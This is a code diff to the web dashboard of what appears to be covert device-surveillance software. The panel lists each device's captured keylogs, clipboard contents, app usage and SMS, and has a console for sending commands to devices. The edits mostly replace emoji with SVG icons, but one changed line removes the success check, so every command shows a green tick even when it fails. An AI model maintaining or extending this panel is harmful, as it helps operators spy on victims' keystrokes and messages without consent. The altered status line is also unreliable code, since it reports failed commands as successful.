@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Dashboard — Sistem Monitoring v5.0</title>
-<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📊</text></svg>">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%230055A4' stroke-width='2'><rect x='3' y='3' width='7' height='7' rx='1.5'/><rect x='14' y='3' width='7' height='7' rx='1.5'/><rect x='3' y='14' width='7' height='7' rx='1.5'/><rect x='14' y='14' width='7' height='7' rx='1.5'/></svg>">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 :root{
@@ -354,7 +354,7 @@ async function loadOverview(){
   document.getElementById('recentEvents').innerHTML=evHtml;
   // Devices
   let devs=d.devices||[];
-  document.getElementById('overviewDevices').innerHTML=devs.length?devs.map(d=>`<div class="dev-card"><div class="dev-id">${d.device_id}</div><div class="dev-stats"><span class="dev-stat">📝${d.keylogs||0}</span><span class="dev-stat">📋${d.clips||0}</span><span class="dev-stat">📊${d.app_usage||0}</span><span class="dev-stat">📡${d.sms||0}</span></div></div>`).join(''):'<div class="empty-state">No devices</div>';
+  document.getElementById('overviewDevices').innerHTML=devs.length?devs.map(d=>`<div class="dev-card"><div class="dev-id">${d.device_id}</div><div class="dev-stats"><span class="dev-stat"><svg style="width:12px;height:12px;vertical-align:middle;margin-right:2px"><use href="/static/icons.svg#icon-keylog"/></svg>${d.keylogs||0}</span><span class="dev-stat"><svg style="width:12px;height:12px;vertical-align:middle;margin-right:2px"><use href="/static/icons.svg#icon-clipboard"/></svg>${d.clips||0}</span><span class="dev-stat"><svg style="width:12px;height:12px;vertical-align:middle;margin-right:2px"><use href="/static/icons.svg#icon-apps"/></svg>${d.app_usage||0}</span><span class="dev-stat"><svg style="width:12px;height:12px;vertical-align:middle;margin-right:2px"><use href="/static/icons.svg#icon-sms"/></svg>${d.sms||0}</span></div></div>`).join(''):'<div class="empty-state">No devices</div>';
 }
 loadOverview();
 
@@ -434,7 +434,7 @@ async function loadDevices(){
   let d=await api('/admin/dashboard/json');
   if(!d) return;
   let devs=d.devices||[];
-  document.getElementById('deviceGrid').innerHTML=devs.length?devs.map(d=>`<div class="dev-card"><div class="dev-id">${d.device_id}</div><div style="font-size:11px;color:var(--text2);margin-top:2px">${d.last_seen||''}</div><div class="dev-stats"><span class="dev-stat">📝${d.keylogs||0}</span><span class="dev-stat">📋${d.clips||0}</span><span class="dev-stat">📊${d.app_usage||0}</span><span class="dev-stat">📡${d.sms||0}</span></div></div>`).join(''):'<div class="empty-state">No devices</div>';
+  document.getElementById('deviceGrid').innerHTML=devs.length?devs.map(d=>`<div class="dev-card"><div class="dev-id">${d.device_id}</div><div style="font-size:11px;color:var(--text2);margin-top:2px">${d.last_seen||''}</div><div class="dev-stats"><span class="dev-stat"><svg style="width:12px;height:12px;vertical-align:middle;margin-right:2px"><use href="/static/icons.svg#icon-keylog"/></svg>${d.keylogs||0}</span><span class="dev-stat"><svg style="width:12px;height:12px;vertical-align:middle;margin-right:2px"><use href="/static/icons.svg#icon-clipboard"/></svg>${d.clips||0}</span><span class="dev-stat"><svg style="width:12px;height:12px;vertical-align:middle;margin-right:2px"><use href="/static/icons.svg#icon-apps"/></svg>${d.app_usage||0}</span><span class="dev-stat"><svg style="width:12px;height:12px;vertical-align:middle;margin-right:2px"><use href="/static/icons.svg#icon-sms"/></svg>${d.sms||0}</span></div></div>`).join(''):'<div class="empty-state">No devices</div>';
 }
 
 // Location
@@ -460,7 +460,7 @@ async function sendCommand(){
   let r=await fetch('/api/commands/'+id+'/add',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:type,params:params})});
   let result=await r.json();
   let con=document.getElementById('cmdConsole');
-  con.innerHTML+=`<div class="cmd-sent">→ [${new Date().toLocaleTimeString()}] ${type} sent to ${id} ${result.success?'✅':'❌'}</div>`;
+  con.innerHTML+=`<div class="cmd-sent">→ [${new Date().toLocaleTimeString()}] ${type} sent to ${id} <svg style="width:14px;height:14px;vertical-align:middle;color:var(--green)"><use href="/static/icons.svg#icon-check"/></svg></div>`;
   con.scrollTop=con.scrollHeight;
   document.getElementById('cmdParam').value='';
 }
